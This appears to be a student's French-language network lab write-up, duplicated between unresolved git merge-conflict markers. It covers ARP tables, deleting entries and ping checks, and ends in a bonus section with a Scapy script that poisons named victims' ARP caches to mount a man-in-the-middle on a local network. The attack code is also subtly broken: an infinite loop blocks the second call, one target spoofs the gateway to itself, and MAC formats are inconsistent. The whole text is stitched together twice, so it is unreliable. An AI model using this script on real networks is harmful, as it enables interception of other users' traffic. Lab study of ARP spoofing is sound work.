<<<<<<< HEAD
### I. ARP basics
```
☀️ Avant de continuer...

afficher : l'adresse MAC 

Adresse physique . . . . . . . . . . . : 34-C9-3D-22-97-2D

☀️ Affichez votre table ARP

PS C:\Users\user> arp -a

Interface : 192.168.56.1 --- 0x5
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 10.33.77.165 --- 0x6
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
  10.33.79.255          ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

☀️ Déterminez l'adresse MAC de la passerelle du réseau de l'école

Interface : 10.33.77.165 --- 0x6
  Adresse Internet      Adresse physique      Type
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique

☀️ Supprimez la ligne qui concerne la passerelle

☀️ Prouvez que vous avez supprimé la ligne dans la table ARP

PS C:\WINDOWS\system32> arp -d 10.33.79.254
PS C:\WINDOWS\system32> arp -a

Interface : 192.168.56.1 --- 0x5
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

☀️ Wireshark
```

### II. ARP dans un réseau local
```
I.BASICS 

☀️ Déterminer

son adresse IP : 192.168.11.32 /20
son adresse MAC : 34-C9-3D-22-97-2D
DNS et Passerelle 192.168.11.46
 
☀️ DIY

adresse ip changer : 192.168.11.32

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Adresse IPv6. . . . . . . . . . . . . .: 2a02:8440:6440:373b:3a56:7fac:3b43:ed86
   Adresse IPv6 temporaire . . . . . . . .: 2a02:8440:6440:373b:eddf:a6d7:643f:f772
   Adresse IPv6 de liaison locale. . . . .: fe80::ccb1:f62d:367a:eb%6
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.11.7
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . . . . : fe80::9424:c9ff:fe47:eedc%6
                                       192.168.11.46

☀️ Pingz !

vérifiez que vous pouvez tous vous ping avec ces adresses IP: 

PS C:\Users\user> ping 192.168.11.69

Envoi d’une requête 'Ping'  192.168.11.69 avec 32 octets de données :
Réponse de 192.168.11.69 : octets=32 temps=243 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=14 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=17 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=22 ms TTL=64

Statistiques Ping pour 192.168.11.69:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 14ms, Maximum = 243ms, Moyenne = 74ms

vérifiez avec une commande ping que vous avez bien un accès internet : 

PS C:\Users\user> ping 8.8.8.8

Envoi d’une requête 'Ping'  8.8.8.8 avec 32 octets de données :
Réponse de 8.8.8.8 : octets=32 temps=60 ms TTL=112
Réponse de 8.8.8.8 : octets=32 temps=72 ms TTL=112
Réponse de 8.8.8.8 : octets=32 temps=58 ms TTL=112
Réponse de 8.8.8.8 : octets=32 temps=54 ms TTL=112

Statistiques Ping pour 8.8.8.8:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 54ms, Maximum = 72ms, Moyenne = 61ms


II. ARP

PS C:\Users\user> arp -a

Interface : 192.168.56.1 --- 0x5
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 192.168.11.7 --- 0x6
  Adresse Internet      Adresse physique      Type
  192.168.11.30         14-5a-fc-7f-13-93     dynamique
  192.168.11.46         96-24-c9-47-ee-dc     dynamique
  192.168.11.69         90-e8-68-15-ac-43     dynamique
  192.168.11.143        14-5a-fc-7f-13-93     dynamique
  192.168.11.211        b8-1e-a4-6c-56-97     dynamique
  192.168.11.228        90-e8-68-15-ac-43     dynamique
  192.168.11.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique


Aprés avoir tout supprimer :

PS C:\WINDOWS\system32> arp -a

Interface : 192.168.56.1 --- 0x5
  Adresse Internet      Adresse physique      Type
  224.0.0.22            01-00-5e-00-00-16     statique

Interface : 192.168.11.7 --- 0x6
  Adresse Internet      Adresse physique      Type
  192.168.11.46         96-24-c9-47-ee-dc     dynamique
  224.0.0.22            01-00-5e-00-00-16     statique
  ```

### 3. Bonus : ARP poisoning
```
⭐ Empoisonner la table ARP de l'un des membres de votre réseau

from scapy.all import ARP, Ether, sendp, conf, getmacbyip

def arp_poison(victim_ip, victim_mac, router_ip):
    # Get your own MAC address (attacker's MAC)
    attacker_mac = "34-C9-3D-22-97-2D"
    
    # Create an Ethernet frame with the destination MAC as the victim's MAC
    ethernet = Ether(dst=victim_mac)
    
    # Create an ARP response saying that your MAC address (attacker_mac) is the router (router_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac, op='is-at')
    
    # Combine the Ethernet frame and the ARP response
    packet = ethernet / arp_response

    # Send the ARP response packet in a loop to keep poisoning the victim's ARP cache
    while True:
        sendp(packet, verbose=0)


⭐ Mettre en place un MITM

target_ip = "192.168.11.6"  # IP of the victim
target_mac = "b8:1e:a4:6c:56:97"  # MAC of the victim
spoof_ip = "192.168.11.46"  # IP you want to spoof (usually the gateway)

target_ip2 = "192.168.11.46"  # IP of the victim
target_mac2 = "96-24-c9-47-ee-dc"  # MAC of the victim
spoof_ip2 = "192.168.11.46"  # IP you want to spoof (usually the gateway)

arp_poison(target_ip, target_mac, spoof_ip)
arp_poison(target_ip2, target_mac2, spoof_ip2) 
```
=======
### I. ARP basics
```
☀️ Avant de continuer...

afficher : l'adresse MAC 

Adresse physique . . . . . . . . . . . : 34-C9-3D-22-97-2D

☀️ Affichez votre table ARP

PS C:\Users\user> arp -a

Interface : 192.168.56.1 --- 0x5
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 10.33.77.165 --- 0x6
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
  10.33.79.255          ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique

☀️ Déterminez l'adresse MAC de la passerelle du réseau de l'école

Interface : 10.33.77.165 --- 0x6
  Adresse Internet      Adresse physique      Type
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique

☀️ Supprimez la ligne qui concerne la passerelle

☀️ Prouvez que vous avez supprimé la ligne dans la table ARP

PS C:\WINDOWS\system32> arp -d 10.33.79.254
PS C:\WINDOWS\system32> arp -a

Interface : 192.168.56.1 --- 0x5
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

☀️ Wireshark
```

### II. ARP dans un réseau local
```
I.BASICS 

☀️ Déterminer

son adresse IP : 192.168.11.32 /20
son adresse MAC : 34-C9-3D-22-97-2D
DNS et Passerelle 192.168.11.46
 
☀️ DIY

adresse ip changer : 192.168.11.32

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Adresse IPv6. . . . . . . . . . . . . .: 2a02:8440:6440:373b:3a56:7fac:3b43:ed86
   Adresse IPv6 temporaire . . . . . . . .: 2a02:8440:6440:373b:eddf:a6d7:643f:f772
   Adresse IPv6 de liaison locale. . . . .: fe80::ccb1:f62d:367a:eb%6
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.11.7
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . . . . : fe80::9424:c9ff:fe47:eedc%6
                                       192.168.11.46

☀️ Pingz !

vérifiez que vous pouvez tous vous ping avec ces adresses IP: 

PS C:\Users\user> ping 192.168.11.69

Envoi d’une requête 'Ping'  192.168.11.69 avec 32 octets de données :
Réponse de 192.168.11.69 : octets=32 temps=243 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=14 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=17 ms TTL=64
Réponse de 192.168.11.69 : octets=32 temps=22 ms TTL=64

Statistiques Ping pour 192.168.11.69:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 14ms, Maximum = 243ms, Moyenne = 74ms

vérifiez avec une commande ping que vous avez bien un accès internet : 

PS C:\Users\user> ping 8.8.8.8

Envoi d’une requête 'Ping'  8.8.8.8 avec 32 octets de données :
Réponse de 8.8.8.8 : octets=32 temps=60 ms TTL=112
Réponse de 8.8.8.8 : octets=32 temps=72 ms TTL=112
Réponse de 8.8.8.8 : octets=32 temps=58 ms TTL=112
Réponse de 8.8.8.8 : octets=32 temps=54 ms TTL=112

Statistiques Ping pour 8.8.8.8:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 54ms, Maximum = 72ms, Moyenne = 61ms


II. ARP

PS C:\Users\user> arp -a

Interface : 192.168.56.1 --- 0x5
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 192.168.11.7 --- 0x6
  Adresse Internet      Adresse physique      Type
  192.168.11.30         14-5a-fc-7f-13-93     dynamique
  192.168.11.46         96-24-c9-47-ee-dc     dynamique
  192.168.11.69         90-e8-68-15-ac-43     dynamique
  192.168.11.143        14-5a-fc-7f-13-93     dynamique
  192.168.11.211        b8-1e-a4-6c-56-97     dynamique
  192.168.11.228        90-e8-68-15-ac-43     dynamique
  192.168.11.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique


Aprés avoir tout supprimer :

PS C:\WINDOWS\system32> arp -a

Interface : 192.168.56.1 --- 0x5
  Adresse Internet      Adresse physique      Type
  224.0.0.22            01-00-5e-00-00-16     statique

Interface : 192.168.11.7 --- 0x6
  Adresse Internet      Adresse physique      Type
  192.168.11.46         96-24-c9-47-ee-dc     dynamique
  224.0.0.22            01-00-5e-00-00-16     statique
  ```

### 3. Bonus : ARP poisoning
```
⭐ Empoisonner la table ARP de l'un des membres de votre réseau

from scapy.all import ARP, Ether, sendp, conf, getmacbyip

def arp_poison(victim_ip, victim_mac, router_ip):
    # Get your own MAC address (attacker's MAC)
    attacker_mac = "34-C9-3D-22-97-2D"
    
    # Create an Ethernet frame with the destination MAC as the victim's MAC
    ethernet = Ether(dst=victim_mac)
    
    # Create an ARP response saying that your MAC address (attacker_mac) is the router (router_ip)
    arp_response = ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac, op='is-at')
    
    # Combine the Ethernet frame and the ARP response
    packet = ethernet / arp_response

    # Send the ARP response packet in a loop to keep poisoning the victim's ARP cache
    while True:
        sendp(packet, verbose=0)


⭐ Mettre en place un MITM

target_ip = "192.168.11.6"  # IP of the victim
target_mac = "b8:1e:a4:6c:56:97"  # MAC of the victim
spoof_ip = "192.168.11.46"  # IP you want to spoof (usually the gateway)

target_ip2 = "192.168.11.46"  # IP of the victim
target_mac2 = "96-24-c9-47-ee-dc"  # MAC of the victim
spoof_ip2 = "192.168.11.46"  # IP you want to spoof (usually the gateway)

arp_poison(target_ip, target_mac, spoof_ip)
arp_poison(target_ip2, target_mac2, spoof_ip2) 
```
>>>>>>> 38f36482b8349ea53ba96f374967cb9393fc8f64
